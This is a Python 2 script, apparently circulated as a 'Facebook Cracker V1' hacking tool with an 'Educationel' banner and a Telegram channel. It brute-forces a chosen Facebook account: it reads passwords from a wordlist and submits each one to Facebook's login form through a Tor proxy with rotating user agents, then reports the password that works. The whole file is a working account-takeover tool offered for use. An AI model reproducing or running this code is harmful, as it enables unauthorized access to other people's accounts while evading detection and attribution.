wel2 = """
+----------------------------------------------+
| Name:        Facebook Cracker V1
| Purpose:     Educationel
| Author:     hacker ghost
| Telegram Channel : https://t.me/learnhackixbud
| Created:     17/10/2019
| Copyright:   (c) hacker ghost 2019
| Licence:     <>
+----------------------------------------------+
"""

import os
import sys
import mechanize
import cookielib
import random
import socket
from sys import platform
if sys.platform.startswith('win32'):
    os.system("cls")
if sys.platform.startswith('linux'):
   os.system("clear")
if sys.platform.startswith('linux2'):
    os.system("clear")
if sys.platform.startswith('unix'):
    os.system("clear")

print(wel2)
print("pls open tor this script need tor to work")

email = (raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = (raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'



useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.set_proxies({"socks":"127.0.0.1:9150"})
    welcome()
    search()
    print("Password does not exist in the wordlist")



def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    cookies = cookielib.CookieJar()
    cookies.clear_session_cookies()
    if log != login and (not 'login_attempt' in log):
            print("\n\n[+] Password Find = {}".format(password))
            raw_input("ANY KEY to Exit....")
            sys.exit(1)


def search():
    global password
    passwords = open(passwordlist,"r")
    for password in passwords:
        password = password.replace("\n","")
        brute(password)


#welcome
def welcome():
    wel = """
+----------------------------------------------+
| Name:        Facebook Cracker V1
| Purpose:     Educationel
| Author:      hacker ghost
| Telegram Channel : https://t.me/learnhackixbud
| Created:     17/10/2019
| Copyright:   (c) hacker ghost 2019
| Licence:     <>
+----------------------------------------------+
"""
    total = open(passwordlist,"r")
    total = total.readlines()
    print (wel)
    print (" [*] Account to crack : {}".format(email))
    print (" [*] Loaded :" , len(total), "passwords")
    print (" [*] Cracking, please wait ...\n\n")


if __name__ == '__main__':
    main()